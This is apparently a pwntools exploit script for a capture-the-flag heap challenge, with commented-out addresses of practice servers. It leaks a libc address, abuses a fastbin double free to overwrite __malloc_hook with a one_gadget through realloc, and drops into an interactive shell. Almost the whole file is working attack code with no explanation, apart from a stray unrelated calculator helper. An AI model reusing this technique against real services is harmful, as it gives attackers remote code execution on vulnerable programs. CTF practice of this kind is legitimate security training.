# import time
from pwn import *

# from LibcSearcher import *

# from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = process('./double_free')
io = remote("192.168.170.128", 9998)


# io = remote("192.168.170.128", 1234)
# io = remote("47.76.55.63", 23877)
# io = remote("node4.buuoj.cn", 28567)


# io = remote("120.46.59.242",   2150)
# io = remote("43.249.195.138",  26189)
# io = remote("8.130.35.16", 52003)
# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("112.6.51.212", 30791)


# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
# elf = ELF('./ciscn_2019_es_2')
# libc = ELF('./2.31-0ubuntu9_amd64/libc-2.31.so')


# libc = ELF('./libc-2.23.so')

def s(a):
    io.send(a)


def sa(a, b):
    io.sendafter(a, b)


def sl(a):
    io.sendline(a)


def sal(a, b):
    io.sendlineafter(a, b)


def r(n):
    return (io.recv(n))


def ru(a):
    return io.recvuntil(a)


def rl():
    return io.recvline()


def sla(a, b):
    io.sendlineafter(a, b)


def debug():
    gdb.attach(io)
    pause()


def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))


def inter():
    return io.interactive()


def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Error: Invalid operator"

    return result


def CreateHeap(size, content):
    io.recvuntil(':')
    io.sendline('1')
    io.recvuntil(':')
    io.sendline(str(size))
    io.recvuntil(':')
    io.sendline(content)


def EditHeap(idx, size, content):
    io.recvuntil(':')
    io.sendline('2')
    io.recvuntil(':')
    io.sendline(str(idx))
    io.recvuntil(':')
    io.sendline(str(size))
    io.recvuntil(':')
    io.sendline(content)


def DeleteHeap(idx):
    io.recvuntil(':')
    io.sendline('3')
    io.recvuntil(':')
    io.sendline(str(idx))


# puts_plt = elf.plt['puts']
# puts_got = elf.got['puts']
# printf_plt = elf.plt['printf']
# atoi_got = elf.got['atoi']
# main_addr = elf.symbols['main']
#
# libc = ELF('./libc.so.6')

context(os='linux', arch='amd64')
# context(os='linux', arch='amd64', log_level="debug")


# def choice(a):
#     io.sendlineafter('4. exit\n', str(a))
#
#
# def add(a, b):
#     choice(1)
#     io.sendlineafter(b'size\n', str(a))
#     ru(b'content\n')
#     sl(b)
#
#
# def show(a):
#     choice(3)
#
#     io.sendlineafter('\n', str(a))
#
#
# def delete(a):
#     choice(2)
#
#     io.sendlineafter('\n', str(a))

def add(size, content):
    io.recvuntil(b'choice\n')
    io.sendline(b'1')
    io.recvuntil(b'size\n')
    io.sendline(f'{size}'.encode('utf-8'))
    io.recvuntil(b'content\n')
    io.sendline(content)


def delete(id):
    io.recvuntil(b'choice\n')
    io.sendline(b'2')
    io.recvuntil(b'idx\n')
    io.sendline(f'{id}'.encode('utf-8'))

def show(id):
    io.recvuntil(b'choice\n')
    io.sendline(b'3')
    io.recvuntil(b'idx\n')
    io.sendline(f'{id}'.encode('utf-8'))



def exit():
    ru(b"choice")
    sl(b'4')

libc = ELF('./libc-2.23.so')
one_gadget = 0x4527a

add(0x21, b'aaaa')  # 0
add(0xf8, b'aaaa')  # 1
add(0x21, b'aaaa')  # 2
delete(1)
show(1)
# print(rl())
# print(rl())
main_arena_88 = u64(ru(b'\x7f').ljust(8, b'\x00'))
print(hex(main_arena_88))
malloc_hook = (main_arena_88 - 88) - 0x10
libc_base = malloc_hook - libc.symbols['__malloc_hook']
print('libc_base:', hex(libc_base))
print(libc.symbols['__malloc_hook'])
one_gadget += libc_base
realloc = libc_base + libc.symbols['realloc']
print(hex(libc_base))
print(hex(one_gadget))

add(0x60, b'1')  # 3
add(0x60, b'1')  # 4
# gdb.attach(io)
# add(0xf8, b'a') #4

delete(3)
delete(4)
delete(3)
add(0x60, p64(libc.sym['__malloc_hook'] + libc_base - 0x23))
add(0x60, b'1')
# gdb.attach(io)
add(0x60, p64(libc.sym['__malloc_hook'] + libc_base - 0x23))

add(0x60,  b'a' * 0x8 + b'a' * 0x3 + p64(one_gadget) + p64(realloc + 0xc))

ru(b'choice')
sl(b'1')
ru(b'size')
sl(b"666")

inter()

